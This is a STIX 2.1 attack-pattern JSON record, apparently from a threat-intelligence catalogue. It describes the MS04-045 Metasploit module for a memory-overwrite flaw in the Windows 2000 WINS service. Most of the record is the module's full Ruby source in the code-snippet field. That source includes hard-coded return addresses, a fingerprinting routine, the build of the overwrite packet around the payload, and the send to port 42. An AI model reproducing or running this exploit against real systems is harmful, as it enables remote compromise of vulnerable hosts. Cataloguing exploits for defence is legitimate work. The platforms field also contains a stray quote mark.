{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7837bb3f-f162-4153-a500-5939ac70cc48",
    "created": "2024-08-14T16:47:48.431765Z",
    "modified": "2024-08-14T16:47:48.431768Z",
    "name": "MS04-045 Microsoft WINS Service Memory Overwrite",
    "description": " This module exploits an arbitrary memory write flaw in the WINS service. This exploit has been tested against Windows 2000 only.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/wins/ms04_045_wins.rb",
            "external_id": "ms04_045_wins.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-1080"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS04-045 Microsoft WINS Service Memory Overwrite',\n      'Description'    => %q{\n        This module exploits an arbitrary memory write flaw in the\n        WINS service. This exploit has been tested against Windows\n        2000 only.\n\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-1080'],\n          [ 'OSVDB', '12378'],\n          [ 'BID', '11763'],\n          [ 'MSB', 'MS04-045'],\n\n        ],\n      'Privileged'     => true,\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 8000,\n          'MinNops'  => 512,\n          'StackAdjustment' => -3500,\n\n        },\n      'Platform'      => %w{ win },\n      'Targets'        =>\n        [\n          [\n            'Windows 2000 English', # Tested OK - 11/25/2005 hdm\n            {\n              'Platform' => 'win',\n              'Rets'     => [ 0x5391f40, 0x53df4c4, 0x53922e0],\n            },\n          ],\n        ],\n      'DisclosureDate' => '2004-12-14',\n      'DefaultTarget' => 0))\n\n      register_options(\n        [\n          Opt::RPORT(42)\n        ])\n  end\n\n  def check\n    ret = fprint()\n\n    info = 'This system is running '\n    info << ((ret[1] == '?') ? 'an unknown windows version ' : \"Windows #{ret[1]} \")\n    info << ((ret[2] == '?') ? '' : \"with service pack #{ret[2]} \")\n    info << (ret[3] ? '(clean heap)' : '(dirty heap)')\n\n    print_status(info)\n    return ret[0]\n  end\n\n  def exploit\n    ret = fprint()\n\n    if (ret[0] != Exploit::CheckCode::Vulnerable)\n      print_status(\"This system does not appear to be vulnerable\")\n      return\n    end\n\n    # Windows 2000 SP0, SP2, SP3, SP4 only. SP1 does not have the\n    # same function pointer...\n    if (ret[1] != '2000' or ret[2] !~ /^[0234]/)\n      print_status(\"This target is not currently supported\")\n      return\n    end\n\n    # This flag is un-set if the first leaked address is not the default of\n    # 0x05371e90. This can indicate that someone has already tried to exploit\n    # this system, or something major happened to the heap that will probably\n    # prevent this exploit from working.\n    if (not ret[3])\n      print_warning(\"Warning: the leaked heap address indicates that this attack may fail\");\n    end\n\n    # The base address of our structure in memory\n    base = target['Rets'][0]\n\n    # Address of the function pointers to overwrite (courtesy anonymous donor)\n    targ = target['Rets'][1]\n\n    # Address of the payload on the heap, past the structure\n    code = target['Rets'][2]\n\n    # Build up the wins packet\n    addr = ''\n    addr << ([code].pack('V') * 9)\n    addr << ([targ - 0x48].pack('V') * 14)\n\n    wins = addr * 10\n    wins << payload.encoded\n    wins << rand_text_english(9200-wins.length, payload_badchars)\n\n    wpkt = [wins.length + 8, -1, base].pack('NNN')\n    wpkt << wins\n\n    print_status(sprintf(\"Attempting to overwrite 0x%.8x with 0x%.8x (0x%.8x)\", targ, code, base))\n\n    # Connect and send the request\n    connect\n    sock.put(wpkt)\n    handler\n    disconnect\n  end\n\n  # This fingerprinting routine will cause the structure base address to slide down\n  # 120 bytes. Subsequent fingerprints will not push this down any futher, however\n  # we need to make sure that fingerprint is always called before exploitation or\n  # the alignment will be way off.\n  def fprint\n\n    ret = [Exploit::CheckCode::Safe, '', '', '']\n\n    req = \"\\x00\\x00\\x00\\x29\\x00\\x00\\x78\\x00\\x00\\x00\\x00\\x00\"+\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x02\\x00\\x05\"+\n      \"\\x00\\x00\\x00\\x00\\x60\\x56\\x02\\x01\\x00\\x1F\\x6E\\x03\"+\n      \"\\x00\\x1F\\x6E\\x03\\x08\\xFE\\x66\\x03\\x00\"\n\n    connect\n    sock.put(req)\n    data = sock.get_once\n    return ret if not data\n\n    ptrs = [ data[16,4].unpack('N')[0] ].concat( data[32,12].unpack('VVV') )\n\n    print_status(sprintf(\"WINS Fingerprint: [0x%.8x] 0x%.8x 0x%.8x 0x%.8x\", *ptrs))\n\n    os = '2000'\n    sp = '?'\n    vi = false\n\n    # Check for Windows 2000 systems\n    case ptrs[3]\n      when 0x77f8ae78\n        sp = '0'\n      when 0x77f81f70\n        sp = '1'\n      when 0x77f82680\n        sp = '2'\n      when 0x77f83608\n        sp = '3'\n      when 0x77f89640\n        sp = '4'\n      when 0x77f82518\n        sp = '5'\n      when 0x77f81648 # Contributed by grutz[at]jingojango.net\n        sp = '3/4'\n    end\n\n    # Reset the OS string if no match was found\n    os = '?' if sp == '?'\n\n    # Check for Windows NT 4.0 systems\n    if (ptrs[0] > 0x02300000 and ptrs[0] < 0x02400000)\n      os = 'NT'\n      sp = '?'\n    end\n\n    # Heap is still pristine...\n    vi = true if ptrs[0] == 0x05371e90\n\n    # Determine if the patch has already been applied\n    req = \"\\x00\\x00\\x00\\x0F\\x00\\x00\\x78\\x00\" + data[16, 4] +\n      \"\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\"\n\n    sock.put(req)\n    data = sock.get_once\n    disconnect\n\n    ret[1] = os\n    ret[2] = sp\n    ret[3] = vi\n\n    if (data and data[6, 1] == \"\\x78\")\n      ret[0] = Exploit::CheckCode::Vulnerable\n    end\n\n    return ret\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-12-14",
    "x_mitre_platforms": [
        "win'"
    ]
}